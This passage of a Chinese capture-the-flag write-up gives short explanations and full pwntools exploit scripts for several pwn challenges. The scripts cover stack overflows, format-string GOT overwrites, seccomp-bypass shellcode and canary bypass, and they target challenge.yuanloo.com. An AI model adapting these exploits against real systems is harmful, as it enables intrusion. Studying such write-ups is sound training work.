number">0x4011FB</span>main <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>puts <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'%13$p'</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc.so.6'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x24083</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xe3afe</span><span class="token punctuation">,</span> <span class="token number">0xe3b01</span><span class="token punctuation">,</span> <span class="token number">0xe3b04</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseogg1 <span class="token operator">=</span> ogg <span class="token operator">&amp;</span> <span class="token number">0xff</span>ogg2 <span class="token operator">=</span> <span class="token punctuation">(</span>ogg<span class="token operator">>></span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>p <span class="token operator">=</span> <span class="token string">b'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ogg1<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'c%8$hhn'</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ogg2<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'c%8$hn'</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4011EF</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="giaopwn"><a href="#giaopwn" class="headerlink" title="giaopwn"></a>giaopwn</h3><p>栈溢出返回到后门</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">31413</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>code <span class="token operator">=</span> <span class="token number">0x601048</span>bd <span class="token operator">=</span> <span class="token number">0x4006D2</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000400743</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bd<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'YL'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ezorw"><a href="#ezorw" class="headerlink" title="ezorw"></a>ezorw</h3><p>禁用了很多系统调用，用<code>openat</code>、<code>mmap</code>、<code>sendfile</code>代替</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">44021</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>shellcode<span class="token operator">=</span>shellcraft<span class="token punctuation">.</span>openat<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'/flag'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>shellcode<span class="token operator">+=</span>shellcraft<span class="token punctuation">.</span>mmap<span class="token punctuation">(</span><span class="token number">0x10000</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'eax'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>shellcode<span class="token operator">+=</span>shellcraft<span class="token punctuation">.</span>sendfile<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span>shellcode<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'orw'</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ezstack"><a href="#ezstack" class="headerlink" title="ezstack"></a>ezstack</h3><p>字符绕过，用<code>$0</code>代替<code>sh</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">39602</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>bd <span class="token operator">=</span> <span class="token number">0x401275</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bd<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'stack'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'command'</span><span class="token punctuation">,</span> <span class="token string">b"$0\x00"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="msg-bot"><a href="#msg-bot" class="headerlink" title="msg_bot"></a>msg_bot</h3><p><code>protobuf</code>结构体逆向和可见字符<code>shellcode</code>，利用<code>32</code>位的<code>open</code>（即<code>64</code>位的<code>fstat</code>)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> bot_pb2 <span class="token keyword">import</span> Msgbot<span class="token keyword">import</span> grpccontext<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">21231</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''push 0x66666963pop rsixor qword ptr [rax + 0x20], rsipush rbxpop rdixor al, 0x22push raxpop rsipush 0x66666963pop rdxpush rbxpop raxpush raxpush raxpush raxpush raxpush raxpush rax\x6c\x6c\x66\x66'''</span>msgcontent <span class="token operator">=</span> <span class="token string">b'\x68\x63\x69\x66\x66\x5e\x48\x31\x70\x20\x53\x5f\x34\x22\x50\x5e\x68\x63\x69\x66\x66\x5a\x53\x58'</span> <span class="token operator">+</span> <span class="token string">b'\x50'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token string">b'\x6c\x6c\x66\x66'</span>msg <span class="token operator">=</span> Msgbot<span class="token punctuation">(</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>msgid <span class="token operator">=</span> <span class="token number">0xC0DEFEED</span>msg<span class="token punctuation">.</span>msgsize <span class="token operator">=</span> <span class="token number">0xF00DFACE</span>msg<span class="token punctuation">.</span>msgcontent <span class="token operator">=</span> msgcontentserialized <span class="token operator">=</span> msg<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'botmsg'</span><span class="token punctuation">,</span> serialized<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''mov  eax, 5push ecxpop  ebxmov  dword ptr [ecx], 0x6c662f2eadd  ecx, 4mov  dword ptr [ecx], 0x6761xor ecx, ecxxor edx, edxint  0x80'''</span>shellcode <span class="token operator">=</span> <span class="token string">b"\xb8\x05\x00\x00\x00\x51\x5b\xc7\x01\x2e\x2f\x66\x6c\x83\xc1\x04\xc7\x01\x61\x67\x00\x00\x31\xc9\x31\xd2\xcd\x80"</span>shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="round2"><a href="#round2" class="headerlink" title="round2"></a>round2</h2><h3 id="ezstack2"><a href="#ezstack2" class="headerlink" title="ezstack2"></a>ezstack2</h3><p>栈溢出设置一参为<code>0x114514</code>之后直接劫持到<code>vuln</code>函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">47708</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400823</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040056e</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x114514</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400757</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="shortshell"><a href="#shortshell" class="headerlink" title="shortshell"></a>shortshell</h3><p><code>rbx</code>里有地址，直接计算一下<code>jmp</code>过去</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">27490</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''sub bl, 0x18jmp rbx'''</span>p <span class="token operator">=</span> <span class="token string">b'\x80\xeb\x1c\xff\xe3'</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p>控制<code>main</code>和<code>gift</code>的<code>rbp</code>，利用<code>gift</code>读的长度大向<code>main</code>的<code>ret</code>写</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">37134</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>stack_check_fail <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__stack_chk_fail'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x00000000004013e3</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'functions?'</span><span class="token punctuation">,</span> <span class="token string">b'0'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>stack_check_fail <span class="token operator">+</span> <span class="token number">0xa00</span> <span class="token operator">-</span> <span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401296</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'functions?'</span><span class="token punctuation">,</span> <span class="token string">b'0'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>stack_check_fail <span class="token operator">+</span> <span class="token number">0xa00</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401258</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token 